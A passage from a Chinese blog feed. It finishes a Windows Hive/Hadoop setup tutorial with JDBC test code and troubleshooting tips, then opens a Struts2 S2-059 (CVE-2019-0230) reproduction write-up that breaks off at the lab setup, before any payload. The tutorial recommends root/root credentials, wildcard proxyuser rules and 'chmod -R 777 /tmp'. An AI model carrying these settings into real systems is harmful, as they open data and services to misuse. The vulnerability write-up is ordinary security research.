&lt;p&gt;修改&lt;code&gt;hive-site.xml&lt;/code&gt;文件，主要修改下面的属性项：&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;属性名&lt;/th&gt;
&lt;th&gt;属性值&lt;/th&gt;
&lt;th&gt;备注&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;27&quot;&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;code&gt;hive.metastore.warehouse.dir&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;/user/hive/warehouse&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Hive&lt;/code&gt;的数据存储目录，这个是默认值&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;hive.exec.scratchdir&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;/tmp/hive&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Hive&lt;/code&gt;的临时数据目录，这个是默认值&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td&gt;&lt;code&gt;javax.jdo.option.ConnectionURL&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;jdbc:mysql://localhost:3306/hive?characterEncoding=UTF-8&amp;amp;amp;serverTimezone=UTC&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Hive&lt;/code&gt;元数据存放的数据库连接&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;code&gt;javax.jdo.option.ConnectionDriverName&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;com.mysql.cj.jdbc.Driver&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Hive&lt;/code&gt;元数据存放的数据库驱动&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;code&gt;javax.jdo.option.ConnectionUserName&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;root&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Hive&lt;/code&gt;元数据存放的数据库用户&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;code&gt;javax.jdo.option.ConnectionPassword&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;root&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;Hive&lt;/code&gt;元数据存放的数据库密码&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td&gt;&lt;code&gt;hive.exec.local.scratchdir&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;E:/LittleData/apache-hive-3.1.2-bin/data/scratchDir&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;创建本地目录&lt;code&gt;$HIVE_HOME/data/scratchDir&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td&gt;&lt;code&gt;hive.downloaded.resources.dir&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;E:/LittleData/apache-hive-3.1.2-bin/data/resourcesDir&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;创建本地目录&lt;code&gt;$HIVE_HOME/data/resourcesDir&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;code&gt;hive.querylog.location&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;E:/LittleData/apache-hive-3.1.2-bin/data/querylogDir&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;创建本地目录&lt;code&gt;$HIVE_HOME/data/querylogDir&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;6&quot;&gt;&lt;td&gt;&lt;code&gt;hive.server2.logging.operation.log.location&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;E:/LittleData/apache-hive-3.1.2-bin/data/operationDir&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;创建本地目录&lt;code&gt;$HIVE_HOME/data/operationDir&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;datanucleus.autoCreateSchema&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;可选&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;datanucleus.autoCreateTables&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;可选&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;datanucleus.autoCreateColumns&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;true&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;可选&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;hive.metastore.schema.verification&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;false&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;可选&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;修改完毕之后，在本地的&lt;code&gt;MySQL&lt;/code&gt;服务新建一个数据库&lt;code&gt;hive&lt;/code&gt;，编码和字符集可以选用范围比较大的&lt;code&gt;utf8mb4&lt;/code&gt;（虽然官方建议是&lt;code&gt;latin1&lt;/code&gt;，但是字符集往大范围选没有影响）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-12.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上面的准备工作做完之后，可以进行&lt;code&gt;Hive&lt;/code&gt;的元数据库初始化，在&lt;code&gt;$HIVE_HOME/bin&lt;/code&gt;目录下执行下面的脚本：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;hive --service schematool -dbType mysql -initSchema
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里有个小坑，&lt;code&gt;hive-site.xml&lt;/code&gt;文件的第&lt;code&gt;3215&lt;/code&gt;行有个神奇的无法识别的符号：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-13.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;此无法识别符号会导致&lt;code&gt;Hive&lt;/code&gt;的命令执行异常，需要去掉。当控制台输出&lt;code&gt;Initialization script completed schemaTool completed&lt;/code&gt;的时候，说明元数据库已经初始化完毕：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-14.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在&lt;code&gt;$HIVE_HOME/bin&lt;/code&gt;目录下，通过&lt;code&gt;hive.cmd&lt;/code&gt;可以连接&lt;code&gt;Hive&lt;/code&gt;（关闭控制台即可退出）：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;&amp;gt; hive.cmd
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;尝试创建一个表&lt;code&gt;t_test&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;hive&amp;gt;  create table t_test(id INT,name string);
hive&amp;gt;  show tables;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查看&lt;code&gt;http://localhost:50070/&lt;/code&gt;确认&lt;code&gt;t_test&lt;/code&gt;表已经创建成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-15.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;尝试执行一个写入语句和查询语句：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;hive&amp;gt;  insert into t_test(id,name) values(1,'throwx');
hive&amp;gt;  select * from t_test;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-16.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;写用了&lt;code&gt;30&lt;/code&gt;多秒，读用了&lt;code&gt;0.165&lt;/code&gt;秒。&lt;/p&gt;
&lt;h2 id=&quot;使用jdbc连接hive&quot;&gt;使用JDBC连接Hive&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;HiveServer2&lt;/code&gt;是&lt;code&gt;Hive&lt;/code&gt;服务端接口模块，必须启动此模块，远程客户端才能对&lt;code&gt;Hive&lt;/code&gt;进行数据写入和查询。目前，此模块还是基于&lt;code&gt;Thrift RPC&lt;/code&gt;实现，它是&lt;code&gt;HiveServer&lt;/code&gt;的改进版，支持多客户端接入和身份验证等功能。配置文件&lt;code&gt;hive-site.xml&lt;/code&gt;中可以修改下面几个关于&lt;code&gt;HiveServer2&lt;/code&gt;的常用属性：&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;属性名&lt;/th&gt;
&lt;th&gt;属性值&lt;/th&gt;
&lt;th&gt;备注&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody readability=&quot;8&quot;&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;code&gt;hive.server2.thrift.min.worker.threads&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;5&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;最小工作线程数，默认值为5&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;code&gt;hive.server2.thrift.max.worker.threads&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;500&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;最大工作线程数，默认值为500&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;hive.server2.thrift.port&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;10000&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;侦听的&lt;code&gt;TCP&lt;/code&gt;端口号，默认值为10000&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td&gt;&lt;code&gt;hive.server2.thrift.bind.host&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;127.0.0.1&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;绑定的主机，默认值为&lt;code&gt;127.0.0.1&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr readability=&quot;2&quot;&gt;&lt;td&gt;&lt;code&gt;hive.execution.engine&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;mr&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;执行引擎，默认值为&lt;code&gt;mr&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;在&lt;code&gt;$HIVE_HOME/bin&lt;/code&gt;目录下执行下面的命令可以启动&lt;code&gt;HiveServer2&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-shell&quot;&gt;hive.cmd --service hiveserver2
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;客户端需要引入&lt;code&gt;hadoop-common&lt;/code&gt;和&lt;code&gt;hive-jdbc&lt;/code&gt;依赖，依赖的版本尽量和对接的&lt;code&gt;Hadoop&lt;/code&gt;和&lt;code&gt;Hive&lt;/code&gt;版本对应。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.apache.hadoop&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;hadoop-common&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;3.3.0&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.apache.hive&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;hive-jdbc&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;3.1.2&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;spring-boot-starter-jdbc&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;2.3.5.RELEASE&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;hadoop-common&lt;/code&gt;依赖链比较长，会连带下载大量其他相关依赖，所以可以找个空闲时间在某个&lt;code&gt;Maven&lt;/code&gt;项目先挂起该依赖下载的任务（笔者挂起此依赖下载任务洗完澡仍然没下完，还会出现&lt;code&gt;org.glassfish:javax.el&lt;/code&gt;的快照包无法下载的问题，不过不影响正常使用）。最后添加一个单元测试类&lt;code&gt;HiveJdbcTest&lt;/code&gt;：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Slf4j
public class HiveJdbcTest {

    private static JdbcTemplate TEMPLATE;
    private static HikariDataSource DS;

    @BeforeClass
    public static void beforeClass() throws Exception {
        HikariConfig config = new HikariConfig();
        config.setDriverClassName(&quot;org.apache.hive.jdbc.HiveDriver&quot;);
        // 这里笔者修改过hive-site.xml的对应配置,因为端口不是默认的10000
//        config.setJdbcUrl(&quot;jdbc:hive2://127.0.0.1:10091&quot;);
        config.setJdbcUrl(&quot;jdbc:hive2://127.0.0.1:10091/db_test&quot;);
        DS = new HikariDataSource(config);
        TEMPLATE = new JdbcTemplate(DS);
    }

    @AfterClass
    public static void afterClass() throws Exception {
        DS.close();
    }

    @Test
    public void testCreateDb() throws Exception {
        TEMPLATE.execute(&quot;CREATE DATABASE db_test&quot;);
    }

    @Test
    public void testCreateTable() throws Exception {
        TEMPLATE.execute(&quot;CREATE TABLE IF NOT EXISTS t_student(id INT,name string,major string)&quot;);
        log.info(&quot;创建t_student表成功&quot;);
    }

    @Test
    public void testInsert() throws Exception {
        int update = TEMPLATE.update(&quot;INSERT INTO TABLE t_student(id,name,major) VALUES(?,?,?)&quot;, p -&amp;gt; {
            p.setInt(1, 10087);
            p.setString(2, &quot;throwable&quot;);
            p.setString(3, &quot;math&quot;);
        });
        log.info(&quot;写入t_student成功,更新记录数:{}&quot;, update);  // 这里比较神奇,数据写入了,返回的update数量为0
    }

    @Test
    public void testSelect() throws Exception {
        List&amp;lt;Student&amp;gt; result = TEMPLATE.query(&quot;SELECT * FROM t_student&quot;, rs -&amp;gt; {
            List&amp;lt;Student&amp;gt; list = new ArrayList&amp;lt;&amp;gt;();
            while (rs.next()) {
                Student student = new Student();
                student.setId(rs.getLong(&quot;id&quot;));
                student.setName(rs.getString(&quot;name&quot;));
                student.setMajor(rs.getString(&quot;major&quot;));
                list.add(student);
            }
            return list;
        });
        // 打印日志：查询t_student成功,结果:[HiveJdbcTest.Student(id=10087, name=throwable, major=math)]
        log.info(&quot;查询t_student成功,结果:{}&quot;, result);
    }

    @Data
    private static class Student {

        private Long id;
        private String name;
        private String major;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;可能遇到的问题&quot;&gt;可能遇到的问题&lt;/h2&gt;
&lt;p&gt;下面小结一下可能遇到的问题。&lt;/p&gt;
&lt;h3 id=&quot;java虚拟机启动失败&quot;&gt;Java虚拟机启动失败&lt;/h3&gt;
&lt;p&gt;目前定位到是&lt;code&gt;Hadoop&lt;/code&gt;无法使用&lt;code&gt;JDK[9+&lt;/code&gt;的任意版本&lt;code&gt;JDK&lt;/code&gt;，建议切换为任意&lt;code&gt;JDK8&lt;/code&gt;的小版本。&lt;/p&gt;
&lt;h3 id=&quot;出现找不到hadoop执行文件异常&quot;&gt;出现找不到Hadoop执行文件异常&lt;/h3&gt;
&lt;p&gt;确保已经把&lt;code&gt;winutils&lt;/code&gt;中的&lt;code&gt;hadoop-3.3.0\bin&lt;/code&gt;目录下的&lt;code&gt;hadoop.dll&lt;/code&gt;和&lt;code&gt;winutils.exe&lt;/code&gt;文件拷贝到&lt;code&gt;Hadoop&lt;/code&gt;的解压目录的&lt;code&gt;bin&lt;/code&gt;文件夹中。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;start-all.cmd&lt;/code&gt;脚本执行时有可能出现找不到批处理脚本的异常。此问题在公司的开发机出现过，在家用的开发机没有重现，具体解决方案是在&lt;code&gt;start-all.cmd&lt;/code&gt;脚本的首行加入&lt;code&gt;cd $HADOOP_HOME&lt;/code&gt;，如&lt;code&gt;cd E:\LittleData\hadoop-3.3.0&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;无法访问localhost50070&quot;&gt;无法访问localhost:50070&lt;/h3&gt;
&lt;p&gt;一般是因为&lt;code&gt;hdfs-site.xml&lt;/code&gt;配置遗漏了&lt;code&gt;dfs.http.address&lt;/code&gt;配置项，添加：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;dfs.http.address&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;0.0.0.0:50070&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;然后调用&lt;code&gt;stop-all.cmd&lt;/code&gt;，再调用&lt;code&gt;start-all.cmd&lt;/code&gt;重启&lt;code&gt;Hadoop&lt;/code&gt;即可。&lt;/p&gt;
&lt;h3 id=&quot;hive连接mysql异常&quot;&gt;Hive连接MySQL异常&lt;/h3&gt;
&lt;p&gt;注意&lt;code&gt;MySQL&lt;/code&gt;的驱动包是否已经正确拷贝到&lt;code&gt;$HIVE_HOME/lib&lt;/code&gt;下，并且检查&lt;code&gt;javax.jdo.option.ConnectionURL&lt;/code&gt;等四个属性是否配置正确。如果都正确，注意是否&lt;code&gt;MySQL&lt;/code&gt;的版本存在问题，或者服务的版本与驱动版本不匹配。&lt;/p&gt;
&lt;h3 id=&quot;hive找不到批处理文件&quot;&gt;Hive找不到批处理文件&lt;/h3&gt;
&lt;p&gt;一般描述是&lt;code&gt;'xxx.cmd' is not recognized as an internal or external command...&lt;/code&gt;，一般是&lt;code&gt;Hive&lt;/code&gt;的命令执行时的异常，需要把&lt;code&gt;Hive 1.x&lt;/code&gt;的源码包的&lt;code&gt;bin&lt;/code&gt;目录下的所有&lt;code&gt;.cmd&lt;/code&gt;脚本拷贝到&lt;code&gt;$HIVE_HOME/bin&lt;/code&gt;对应的目录下。&lt;/p&gt;
&lt;h3 id=&quot;文件夹权限问题&quot;&gt;文件夹权限问题&lt;/h3&gt;
&lt;p&gt;常见如&lt;code&gt;CreateSymbolicLink&lt;/code&gt;异常，会导致&lt;code&gt;Hive&lt;/code&gt;无法使用&lt;code&gt;INSERT&lt;/code&gt;或者&lt;code&gt;LOAD&lt;/code&gt;命令写入数据。出现这类问题可以通过下面方式解决：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;Win + R&lt;/code&gt;然后运行&lt;code&gt;gpedit.msc&lt;/code&gt; - 计算机设置 - &lt;code&gt;Windows&lt;/code&gt;设置 — 安全设置 - 本地策略 - 用户权限分配 - 创建符号链接 - 添加当前用户。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-17.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;或者&lt;strong&gt;直接使用管理员账号或者管理员权限启动&lt;code&gt;CMD&lt;/code&gt;&lt;/strong&gt;，然后执行对应的脚本启动&lt;code&gt;Hadoop&lt;/code&gt;或者&lt;code&gt;Hive&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;sessionnotrunning异常&quot;&gt;SessionNotRunning异常&lt;/h3&gt;
&lt;p&gt;启动&lt;code&gt;HiveServer2&lt;/code&gt;中或者外部客户端连接&lt;code&gt;HiveServer2&lt;/code&gt;时候有可能出现此异常，具体是&lt;code&gt;java.lang.ClassNotFoundException: org.apache.tez.dag.api.TezConfiguration&lt;/code&gt;的异常。解决方案是：配置文件&lt;code&gt;hive-site.xml&lt;/code&gt;中的&lt;code&gt;hive.execution.engine&lt;/code&gt;属性值由&lt;code&gt;tez&lt;/code&gt;修改为&lt;code&gt;mr&lt;/code&gt;，然后重启&lt;code&gt;HiveServer2&lt;/code&gt;即可。因为没有集成&lt;code&gt;tez&lt;/code&gt;，重启后依然会报错，但是&lt;code&gt;60000&lt;/code&gt;ms后会自动重试启动（一般重试后会启动成功）：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://throwable-blog-1256189093.cos.ap-guangzhou.myqcloud.com/202011/w-d-o-s-h-h-g-18.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这算是一个遗留问题，但是不影响客户端正常连接，只是启动时间会多了&lt;code&gt;60&lt;/code&gt;秒。&lt;/p&gt;
&lt;h3 id=&quot;hiveserver2端口冲突&quot;&gt;HiveServer2端口冲突&lt;/h3&gt;
&lt;p&gt;修改配置文件&lt;code&gt;hive-site.xml&lt;/code&gt;中的&lt;code&gt;hive.server2.thrift.port&lt;/code&gt;属性值为未被占用的端口，重启&lt;code&gt;HiveServer2&lt;/code&gt;即可。&lt;/p&gt;
&lt;h3 id=&quot;数据节点安全模式异常&quot;&gt;数据节点安全模式异常&lt;/h3&gt;
&lt;p&gt;一般是出现&lt;code&gt;SafeModeException&lt;/code&gt;异常，提示&lt;code&gt;Safe mode is ON&lt;/code&gt;。通过命令&lt;code&gt;hdfs dfsadmin -safemode leave&lt;/code&gt;解除安全模式即可。&lt;/p&gt;
&lt;h3 id=&quot;authorizationexception&quot;&gt;AuthorizationException&lt;/h3&gt;
&lt;p&gt;常见的是&lt;code&gt;Hive&lt;/code&gt;通过&lt;code&gt;JDBC&lt;/code&gt;客户端连接&lt;code&gt;HiveServer2&lt;/code&gt;服务时候会出现这个异常，具体是信息是：&lt;code&gt;User: xxx is not allowed to impersonate anonymous&lt;/code&gt;。这种情况只需要修改&lt;code&gt;Hadoop&lt;/code&gt;的配置文件&lt;code&gt;core-site.xml&lt;/code&gt;，添加：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-xml&quot;&gt;&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;hadoop.proxyuser.xxx.hosts&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;*&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&amp;lt;property&amp;gt;
    &amp;lt;name&amp;gt;hadoop.proxyuser.xxx.groups&amp;lt;/name&amp;gt;
    &amp;lt;value&amp;gt;*&amp;lt;/value&amp;gt;
&amp;lt;/property&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;这里的xxx是指报错时候具体的系统用户名，例如笔者开发机的系统用户名为doge&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;然后重启&lt;code&gt;Hadoop&lt;/code&gt;服务即可。&lt;/p&gt;
&lt;h3 id=&quot;mapredtask的权限问题&quot;&gt;MapRedTask的权限问题&lt;/h3&gt;
&lt;p&gt;常见的是&lt;code&gt;Hive&lt;/code&gt;通过&lt;code&gt;JDBC&lt;/code&gt;客户端连接&lt;code&gt;HiveServer2&lt;/code&gt;服务执行&lt;code&gt;INSERT&lt;/code&gt;或者&lt;code&gt;LOAD&lt;/code&gt;操作时候抛出的异常，一般描述是&lt;code&gt;Execution Error, return code 1 from org.apache.hadoop.hive.ql.exec.mr.MapRedTask. Permission denied: user=anonymous, access=EXECUTE, inode=&quot;/tmp/hadoop-yarn&quot;:xxxx:supergroup:drwx------&lt;/code&gt;。通过命令&lt;code&gt;hdfs dfs -chmod -R 777 /tmp&lt;/code&gt;赋予匿名用户&lt;code&gt;/tmp&lt;/code&gt;目录的读写权限即可。&lt;/p&gt;
&lt;h2 id=&quot;小结&quot;&gt;小结&lt;/h2&gt;
&lt;p&gt;没什么事最好还是直接在&lt;code&gt;Linux&lt;/code&gt;或者&lt;code&gt;Unix&lt;/code&gt;系统中搭建&lt;code&gt;Hadoop&lt;/code&gt;和&lt;code&gt;Hive&lt;/code&gt;的开发环境比较合理，&lt;code&gt;Windows&lt;/code&gt;系统的文件路径和权限问题会导致很多意想不到的问题。本文参考了大量互联网资料和&lt;code&gt;Hadoop&lt;/code&gt;和&lt;code&gt;Hive&lt;/code&gt;的入门书籍，这里就不一一贴出，站在巨人的肩膀上。&lt;/p&gt;
&lt;p&gt;（本文完 c-4-d e-a-20201102）&lt;/p&gt;
&lt;h2 id=&quot;个人博客&quot;&gt;个人博客&lt;/h2&gt;
</description>
<pubDate>Tue, 03 Nov 2020 00:21:00 +0000</pubDate>
<dc:creator>throwable</dc:creator>
<og:description>前提 笔者目前需要搭建数据平台，发现了Windows系统下，Hadoop和Hive等组件的安装和运行存在大量的坑，而本着有坑必填的目标，笔者还是花了几个晚上的下班时候在多个互联网参考资料的帮助下完成了</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/throwable/p/13917379.html</dc:identifier>
</item>
<item>
<title>Struts2 S2-059 (CVE-2019-0230 ）复现 及流量分析、特征提取 - 顷刻Minute</title>
<link>http://www.cnblogs.com/x00c/p/13917529.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/x00c/p/13917529.html</guid>
<description>&lt;p data-lake-id=&quot;242b75df1516368b7861f86dca3aa9ca&quot;&gt;2020年08月13日，Apache官方发布了Struts2远程代码执行漏洞的风险通告，该漏洞编号为CVE-2019-0230，漏洞等级：高危，漏洞评分：8.5&lt;/p&gt;

&lt;p data-lake-id=&quot;f4f5f8b194cc16a321ecce5900292ec5&quot;&gt;Struts2是一个基于MVC设计模式的Web应用框架，它本质上相当于一个servlet，在MVC设计模式中，Struts2作为控制器(Controller)来建立模型与视图的数据交互。&lt;/p&gt;
&lt;p data-lake-id=&quot;daa83f0e25ec34253450ff9bfb5aeb29&quot;&gt; &lt;/p&gt;
&lt;p data-lake-id=&quot;c02dc080331cf58f4172b781c5d80d68&quot;&gt;漏洞产生的主要原因是因为Apache Struts框架在强制执行时，会对分配给某些标签属性(如id)的属性值执行&lt;span&gt;二次ognl解析&lt;/span&gt;。攻击者可以通过构造恶意的OGNL表达式，并将其设置到可被外部输入进行修改，且会执行OGNL表达式的Struts2标签的属性值，引发OGNL表达式解析，最终造成远程代码执行的影响。&lt;/p&gt;

&lt;div id=&quot;rzgLM&quot; class=&quot;lake-selected&quot; data-card-type=&quot;block&quot; data-lake-card=&quot;codeblock&quot; data-card-value=&quot;data:%7B%22mode%22%3A%22plain%22%2C%22code%22%3A%22Struts%202.0.0%20%E2%80%93%20Struts%202.5.20%22%2C%22id%22%3A%22rzgLM%22%7D&quot; data-language=&quot;plain&quot;&gt;
&lt;div class=&quot;lake-codeblock-content&quot; readability=&quot;31&quot;&gt;
&lt;div class=&quot;CodeMirror-sizer&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;cm-s-default&quot;&gt;
&lt;span class=&quot;lake-preview-line&quot;&gt;&lt;span class=&quot;lake-preview-line-number lake-lm-pad-level-0&quot;&gt;&lt;span class=&quot;lake-preview-codeblock-content&quot;&gt;Struts 2.0.0 – Struts 2.5.20&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;p data-lake-id=&quot;18ea114db201ec5570e9efbc189a1afe&quot;&gt; &lt;/p&gt;

&lt;h2 id=&quot;fUETn&quot; data-lake-id=&quot;007dde9709404297ea0330d80b4c6538&quot;&gt;（1）漏洞环境&lt;/h2&gt;
&lt;p data-lake-id=&quot;72bd25612b9980d6da2f8a46920ca0dc&quot;&gt;&lt;span&gt;攻击机&lt;/span&gt;：192.168.1.129&lt;/p&gt;
&lt;p data-lake-id=&quot;63eb339f18c7c1cfe63a72813d21a260&quot;&gt;&lt;span&gt;靶机&lt;/span&gt;：    192.168.1.12&lt;/p&gt;
&lt;p data-lake-id=&quot;eab013f9b796a58f5d61e13b818abfdc&quot;&gt;这里使用vulhub，很方便。&lt;/p&gt;
